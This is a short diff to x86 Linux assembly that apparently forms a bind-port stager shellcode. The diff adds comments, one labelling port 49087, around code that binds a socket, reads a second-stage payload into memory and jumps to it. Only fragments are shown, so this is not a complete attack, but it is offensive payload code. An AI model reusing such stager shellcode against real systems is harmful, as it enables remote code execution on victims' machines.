@@ -40,7 +40,7 @@ socket:
 bind:
 	inc  ebx
 	push edx
-	push word 0xbfbf
+	push word 0xbfbf ; port: 49087
 	push bx
 	mov  ecx, esp
 	push byte 0x66
@@ -70,5 +70,6 @@ read:
 	mov  dh, 0xc
 	mov  al, 0x3
 	int  0x80
-	mov  edi, ebx    ; not necessary if second stages use ebx instead of edi for fd
+	mov  edi, ebx    ; not necessary if second stages use ebx instead of edi 
+	                 ; for fd
 	jmp  ecx
